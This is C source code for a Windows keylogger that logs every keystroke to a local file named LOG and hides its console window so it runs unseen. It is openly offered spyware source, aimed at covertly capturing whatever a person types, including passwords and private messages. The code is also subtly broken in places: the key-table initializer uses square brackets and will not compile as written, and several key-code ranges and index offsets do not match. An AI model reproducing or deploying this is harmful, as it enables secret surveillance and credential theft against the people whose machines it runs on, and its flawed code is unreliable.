#include <stdio.h>
#include <windows.h> 
#include <winuser.h>

int Save (int key_stroke, char *file);
int Stealth();

char KEY_TABLE[61][10] = [
        "[BACK]", "[TAB]", "[N \n]", "[SHIFT]", "[CTRL]", "[ALT]", "[BRK]", "[C LOCK]",
        "[ESC]", "[PG UP]", "[PG DN]", "[HOME]", "[LEFT]", "[UP]", "[RIGHT]", "[DOWN]",
        "[prtscr]", "[INSERT]", "[DEL]", "[Super]", "[SuperR]", "[N 0]", "[N 1]", "[N 2]",
        "[N 3]", "[N 4]", "[N 5]", "[N 6]", "[N 7]", "[N 8]", "[N 9]", "[N *]",
        "[N +]", "[N -]", "[N .]", "[N /]", "[F1]", "[F2]", "[F3]", "[F4]",
        "[F5]", "[F6]", "[F7]", "[F8]", "[F9]", "[F10]", "[F11]", "[F11]",
        "[N LOCK]","[S LOCK]",";", "=", ",", "-", ".", "/",
        "`", "[", "\\", "]", "\""
];

int main(){
    Stealth(); 
    int i;
    while (1){
        for(i = 8; i <= 190; i++){
            if (GetAsyncKeyState(i) == -32767)
            Save (i,"LOG"); 
        }
    }
    system ("PAUSE");
    return 0;
}

int Save (int key_stroke, char *file){
    if (key_stroke <= 7)
        return 0;
    FILE *OUTPUT_FILE = fopen(file, "a+");

    if (key_stroke < 10)
        fprintf(OUTPUT_FILE, "%s", KEY_TABLE[key_stroke - 8]);
    else if (key_stroke >= 13 && key_stroke <= 20)
        fprintf(OUTPUT_FILE, "%s", KEY_TABLE[key_stroke-11]);
    else if (key_stroke == 27)
        fprintf(OUTPUT_FILE, "%s", KEY_TABLE[8]);
    else if (key_stroke >= 33 && key_stroke <=46)
        fprintf(OUTPUT_FILE, "%s", KEY_TABLE[key_stroke-28]);
    else if (key_stroke >= 91 && key_stroke <= 126)
        fprintf(OUTPUT_FILE, "%s", KEY_TABLE[key_stroke-72]);
    else if (key_stroke >= 144 && key_stroke <=145)
        fprintf(OUTPUT_FILE, "%s", KEY_TABLE[key_stroke-96]);
    else if (key_stroke >= 186 && key_stroke <= 192)
        fprintf(OUTPUT_FILE, "%s", KEY_TABLE[key_stroke-136]);
    else if (key_stroke >= 219 && key_stroke <=222)
        fprintf(OUTPUT_FILE, "%s", KEY_TABLE[key_stroke-162]);
    else
        fprintf(OUTPUT_FILE, "%s", &key_stroke);

    fclose (OUTPUT_FILE);
    return 0;
}

int Stealth(){
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth,0);
}
